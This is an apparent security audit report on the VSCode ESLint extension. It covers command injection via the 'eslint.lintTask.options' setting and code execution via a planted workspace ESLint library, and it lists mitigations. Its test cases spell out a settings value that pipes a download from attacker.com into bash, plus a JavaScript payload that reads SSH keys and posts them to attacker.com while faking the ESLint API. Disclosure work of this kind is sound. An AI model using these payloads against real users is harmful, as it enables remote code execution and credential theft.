# Vulnerabilities in VSCode ESLint Extension

## 1. Command Injection via Unsanitized "eslint.lintTask.options"

### Vulnerability name
Command Injection in ESLint Task Execution

### Description
The VSCode ESLint extension creates a "lint whole folder" task by building a shell command from the ESLint binary concatenated with user-configurable options. The `eslint.lintTask.options` configuration value is provided by users in their settings and is directly concatenated into a shell command without proper sanitization. This allows an attacker to craft a malicious repository with settings that inject arbitrary commands that will be executed when a victim runs the ESLint task.

Steps to trigger:
1. An attacker prepares a repository that includes a manipulated `.vscode/settings.json` file with a payload containing shell metacharacters in the `eslint.lintTask.options` setting.
2. When a victim opens this repository in VS Code, the extension reads the malicious configuration.
3. When the victim executes the "lint whole folder" task (manually or automatically), the unsanitized option is concatenated with the ESLint command, resulting in the execution of injected commands.

### Impact
This vulnerability allows attackers to execute arbitrary commands with the privileges of the VSCode user. An attacker could exfiltrate sensitive data, install malware, or compromise the user's system entirely, potentially leading to complete host compromise.

### Vulnerability rank
High

### Currently implemented mitigations
None detected in the examined code. The extension does not perform any specific sanitization or safe argument handling for the content of `eslint.lintTask.options`. The command is built by simple string concatenation and executed using `vscode.ShellExecution`, which passes the command directly to the shell.

### Missing mitigations
1. Avoid constructing commands via string concatenation. Instead, pass the command and its arguments as an array or use an API that safely escapes or quotes all arguments.
2. Implement rigorous input validation. Validate the contents of `eslint.lintTask.options` against a whitelist of expected safe values or restrict allowed characters to avoid shell metacharacters.
3. Use a more secure command execution method that doesn't involve shell interpretation.

### Preconditions
1. Victim must have the ESLint extension installed.
2. Victim must open a repository with a malicious `.vscode/settings.json` file containing manipulated `eslint.lintTask.options`.
3. Victim must execute the ESLint task (either manually or automatically if configured).

### Source code analysis
In `tasks.ts`, the task provider implements a method that creates a task to lint the whole workspace:

```typescript
public async getTask(): Promise<vscode.Task | undefined> {
  const rootPath = this._workspaceFolder.uri.scheme === 'file' ? this._workspaceFolder.uri.fsPath : undefined;
  if (!rootPath) {
    return undefined;
  }
  try {
    const command = await findEslint(rootPath);
    
    const kind: EslintTaskDefinition = {
      type: 'eslint'
    };
    
    const options: vscode.ShellExecutionOptions = { cwd: this.workspaceFolder.uri.fsPath };
    const config = vscode.workspace.getConfiguration('eslint', this._workspaceFolder.uri);
    const lintTaskOptions = config.get<string>('lintTask.options', '.');
    return new vscode.Task(
      kind, this.workspaceFolder,
      'lint whole folder', 'eslint', new vscode.ShellExecution(`${command} ${lintTaskOptions}`, options),
      '$eslint-stylish'
    );
  } catch (error) {
    return undefined;
  }
}
```

The key vulnerability is in the line:
```typescript
new vscode.ShellExecution(`${command} ${lintTaskOptions}`, options)
```

The `lintTaskOptions` is obtained from user configuration without any validation or sanitization and directly concatenated into the shell command string. Since the `ShellExecution` API passes the full command string to an underlying shell, any malicious payload embedded in `lintTaskOptions` (such as `&&` followed by injected commands) will be executed.

### Security test case
1. Create a malicious repository with the following `.vscode/settings.json` file:
```json
{
  "eslint.lintTask.enable": true,
  "eslint.lintTask.options": ". || curl https://attacker.com/payload | bash"
}
```

2. Share this repository with a victim who uses VSCode with the ESLint extension.

3. When the victim opens the repository and runs the ESLint task "lint whole folder" (either manually from the Tasks menu or automatically if they have it configured to run on certain events):
   - The ESLint extension will create a shell command: `eslint . || curl https://attacker.com/payload | bash`
   - The `||` operator will execute the curl command if ESLint returns a non-zero status code
   - The curl command will download a malicious script from attacker.com and pipe it to bash
   - The malicious script executes with the victim's privileges

The attacker could use various command injection techniques depending on the operating system and environment, such as using semicolons, backticks, ampersands, or pipe symbols.

## 2. Potential RCE via ESLint Library Loading

### Vulnerability name
Remote Code Execution via Malicious ESLint Library

### Description
The VSCode ESLint extension dynamically loads and executes the ESLint library from the user's workspace. If a user opens a repository with a malicious ESLint library, the extension will load and execute this library without adequate validation or sandboxing.

Steps to trigger:
1. Create a malicious repository with a specially crafted ESLint package in node_modules
2. Include arbitrary malicious code in the ESLint library
3. When a victim opens this repository with the VSCode ESLint extension, the malicious code will be loaded and executed

### Impact
This vulnerability allows attackers to execute arbitrary JavaScript code in the context of the VSCode extension host process, potentially gaining access to VSCode APIs and the user's system.

### Vulnerability rank
High

### Currently implemented mitigations
The extension displays warnings when it fails to load ESLint libraries, but there are no preventative measures to block malicious libraries from being loaded and executed.

### Missing mitigations
1. Sandboxing the ESLint library execution
2. Validating the integrity of the ESLint library before loading it
3. Running ESLint in a separate process with reduced privileges

### Preconditions
1. Victim must have the ESLint extension installed
2. Victim must open a repository with a malicious ESLint library
3. The extension must attempt to use the malicious library for linting

### Source code analysis
The extension locates and loads the ESLint library dynamically. In the `/code/server/src/eslint.ts` file, the extension has code to resolve and load the ESLint library:

```typescript
// in resolveSettings function
promise = Files.resolve(eslintPath, settings.resolvedGlobalPackageManagerPath, moduleResolveWorkingDirectory, trace);
// ...
library = loadNodeModule(libraryPath);
if (library === undefined) {
    settings.validate = Validate.off;
    if (!settings.silent) {
        connection.console.error(`Failed to load eslint library from ${libraryPath}. See output panel for more information.`);
    }
} else if (library.CLIEngine === undefined && library.ESLint === undefined) {
    settings.validate = Validate.off;
    connection.console.error(`The eslint library loaded from ${libraryPath} doesn\'t export neither a CLIEngine nor an ESLint class. You need at least eslint@1.0.0`);
} else {
    connection.console.info(`ESLint library loaded from: ${libraryPath}`);
    settings.library = library;
    path2Library.set(libraryPath, library);
}
```

And in `newClass` function in ESLint namespace, the ESLint class is instantiated:

```typescript
export async function newClass(library: ESLintModule, newOptions: ESLintClassOptions | CLIOptions, settings: TextDocumentSettings): Promise<ESLintClass> {
    if (ESLintModule.hasLoadESLint(library)) {
        return new (await library.loadESLint({ useFlatConfig: settings.useFlatConfig }))(newOptions);
    }
    if (ESLintModule.hasESLintClass(library) && settings.useESLintClass) {
        return new library.ESLint(newOptions);
    }
    if (ESLintModule.hasCLIEngine(library)) {
        return new ESLintClassEmulator(new library.CLIEngine(newOptions));
    }
    return new library.ESLint(newOptions);
}
```

This shows that the extension dynamically loads and executes code from the ESLint library in the user's workspace without validating its contents. If the ESLint library contains malicious code, it will be executed when the extension uses the library.

### Security test case
1. Create a malicious repository with the following structure:
```
repository/
├── .eslintrc.json
├── package.json
├── malicious.js
└── node_modules/
    └── eslint/
        ├── package.json
        └── lib/
            └── api.js  # Contains malicious code
```

2. In the malicious `api.js`, include code that executes on load:
```javascript
// Malicious code that executes when the ESLint library is loaded
(function() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  
  // Example: Exfiltrate ssh keys
  try {
    const sshDirectory = path.join(os.homedir(), '.ssh');
    const files = fs.readdirSync(sshDirectory);
    
    const sshKeys = {};
    for (const file of files) {
      if (file.endsWith('id_rsa') || file.endsWith('id_dsa') || file === 'config') {
        sshKeys[file] = fs.readFileSync(path.join(sshDirectory, file), 'utf8');
      }
    }
    
    // Send data to attacker server
    const https = require('https');
    const req = https.request({
      hostname: 'attacker.com',
      port: 443,
      path: '/collect',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    req.write(JSON.stringify(sshKeys));
    req.end();
  } catch (e) {
    // Silent failure
  }
  
  // Export normal-looking ESLint API to avoid suspicion
  module.exports = {
    /* Normal ESLint API methods */
  };
})();
```

3. Share this repository with a victim who uses VSCode with the ESLint extension

4. When the victim opens the repository:
   - The ESLint extension loads the malicious ESLint library
   - The malicious code executes and exfiltrates the victim's SSH keys
   - The victim is unaware that any malicious activity occurred because the ESLint library still appears to function normally